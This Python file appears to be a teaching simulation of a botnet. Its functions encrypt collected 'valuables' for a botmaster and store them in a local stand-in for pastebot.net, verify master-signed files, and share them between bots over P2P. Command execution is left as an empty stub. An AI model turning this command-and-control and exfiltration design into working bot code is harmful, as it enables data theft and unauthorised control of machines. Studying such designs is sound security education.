import os
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import PKCS1_PSS
from Crypto.Hash import SHA
from Crypto.PublicKey import RSA

# Instead of storing files on disk,
# we'll save them in memory for simplicity
filestore = {}
# Valuable data to be sent to the botmaster
valuables = []

###

def save_valuable(data):
    valuables.append(data)

def encrypt_for_master(data, rsa_key):
    z_cipher = PKCS1_OAEP.new(rsa_key)
    index = 0
    encrypted_data = b''
    # the auth cipher has to be encrypted in chunks like this.
    # a smaller block size than the full 512 must be used to allow for padding
    block_size = 470
    while index < len(data):
        if (index + block_size) < len(data):
            encrypted_data += z_cipher.encrypt(data[index : (index + block_size)])
        else:
            encrypted_data += z_cipher.encrypt(data[index:])
        index += block_size
    # Encrypt the file so it can only be read by the bot master
    return encrypted_data

def upload_valuables_to_pastebot(fn):
    # Encrypt the valuables so only the bot master can read them
    valuable_data = "\n".join(valuables)
    valuable_data = bytes(valuable_data, "ascii")  
    encrypted_master = encrypt_for_master(valuable_data, grab_public_key())
    # "Upload" it to pastebot (i.e. save in pastebot folder)
    f = open(os.path.join("pastebot.net", fn), "wb")
    f.write(encrypted_master)
    f.close()

    print("Saved valuables to pastebot.net/%s for the botnet master" % fn)

###

def verify_file(f, rsa_key):
    # Verify the file was sent by the bot master
    signature = f[512:]
    h = SHA.new()
    h.update(f[:512])
    return PKCS1_PSS.new(rsa_key).verify(h, signature)

def process_file(fn, f, rsa_key):
    if verify_file(f, rsa_key):
        # If it was, store it unmodified
        # (so it can be sent to other bots)
        # Decrypt and run the file
        filestore[fn] = f
        print("Stored the received file as %s" % fn)
    else:
        print("The file has not been signed by the botnet master")

def download_from_pastebot(fn):
    # "Download" the file from pastebot.net
    # (i.e. pretend we are and grab it from disk)
    # Open the file as bytes and load into memory
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print("The given file doesn't exist on pastebot.net")
        return
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    process_file(fn, f, grab_public_key())

def p2p_download_file(sconn):
    # Download the file from the other bot
    fn = str(sconn.recv(), "ascii")
    f = sconn.recv()
    print("Receiving %s via P2P" % fn)
    process_file(fn, f, grab_public_key())

###

def p2p_upload_file(sconn, fn):
    # Grab the file and upload it to the other bot
    # You don't need to encrypt it only files signed
    # by the botnet master should be accepted
    # (and your bot shouldn't be able to sign like that!)
    if fn not in filestore:
        print("That file doesn't exist in the botnet's filestore")
        return
    print("Sending %s via P2P" % fn)
    sconn.send(fn)
    sconn.send(filestore[fn])

def run_file(f):
    # If the file can be run,
    # run the commands
    pass

def grab_public_key():
    key_file = open("keys/server_public.pem", 'r')
    rsa_key = RSA.importKey(key_file.read())
    key_file.close()
    return rsa_key